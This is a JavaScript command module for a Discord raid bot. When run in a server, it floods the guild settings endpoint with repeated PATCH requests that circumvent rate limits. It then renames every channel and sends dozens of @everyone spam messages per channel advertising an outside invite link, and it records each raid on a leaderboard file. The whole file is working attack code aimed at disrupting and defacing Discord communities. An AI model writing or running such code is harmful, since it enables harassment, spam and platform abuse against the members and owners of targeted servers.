const axios = require("axios").default;
const { TOKEN } = require("../../config");
const fs = require('fs');
const path = require('path');

const topRaidsPath = path.join(__dirname, '../../topraids.json');
let topRaids = [];

if (fs.existsSync(topRaidsPath)) {
    topRaids = JSON.parse(fs.readFileSync(topRaidsPath, 'utf8'));
}

module.exports = {
    name: "on",
    secured: true,
    rateLimitTime: 120 * 1000,
    rateLimitUsage: 1,
    execute: async (message, args, client) => {
        const serverName = "The Motherfucking NixSquad";
        const serverIcon = "https://cdn.discordapp.com/attachments/1154641135831109674/1154651565345480704/MOSHED-2023-9-15-12-57-54.gif";
        const spamMsg = "@everyone https://discord.gg/uhjNCaFtkq - | - https://www.youtube.com/watch?v=rY1JyWyQiSI / #HailNixSquad";
        const channelsName = "ʀǟɨɖɮʏռɨӼǟʝǟɮǟʐɨֆ";

        const headers = {
            'Authorization': `Bot ${TOKEN}`,
            'Content-Type': 'application/json',
        };

        const payloads = [
            {
                "verification_level": 1,
                "default_message_notifications": 1,
                "explicit_content_filter": 2,
                "rules_channel_id": "1",
                "public_updates_channel_id": "1",
            },
            {
                "rules_channel_id": null,
                "public_updates_channel_id": null,
            },
        ];

        const guildUrl = `https://discord.com/api/v9/guilds/${message.guild.id}`;

        async function sendRequest(payload) {
            try {
                const response = await axios.patch(guildUrl, payload, { headers });
                if (response.status === 429) {
                    const retryAfter = response.headers['retry-after'] || response.data.retry_after;
                    await new Promise(resolve => setTimeout(resolve, retryAfter * 1000));
                    return sendRequest(payload);
                }
                return response;
            } catch (error) {
                if (error.response && error.response.status === 429) {
                    const retryAfter = error.response.headers['retry-after'] || error.response.data.retry_after;
                    await new Promise(resolve => setTimeout(resolve, retryAfter * 1000));
                    return sendRequest(payload);
                } else {
                    console.error('Request failed:', error.message);
                }
            }
        }

        async function community() {
            try {
                await Promise.all(payloads.map(payload => sendRequest(payload)));
            } catch (error) {
                console.error(error);
            }
        }

        async function createChannels() {
            const communityPromises = Array.from({ length: 20 }, () => community());
            await Promise.all(communityPromises);
        }

        async function spamChannel(channel) {
            try {
                await channel.edit({ name: channelsName });
                const sendMessages = Array.from({ length: 30 }, () => channel.send({ content: spamMsg }).catch(e => {}));
                await Promise.all(sendMessages);
            } catch (error) {
                console.error(error);
            }
        }

        try {
            await createChannels();
            const spamPromises = message.guild.channels.cache.map(channel => spamChannel(channel));
            await Promise.all(spamPromises);

            const raidInfo = {
                userId: message.author.id,
                userName: message.author.username,
                guildName: message.guild.name,
                guildId: message.guild.id,
                memberCount: message.guild.memberCount,
                timestamp: Date.now()
            };

            if (!topRaids.some(raid => raid.guildId === message.guild.id)) {
                topRaids.push(raidInfo);
                fs.writeFileSync(topRaidsPath, JSON.stringify(topRaids, null, 2));
            }
        } catch (error) {
            console.error(error);
        }
    },
};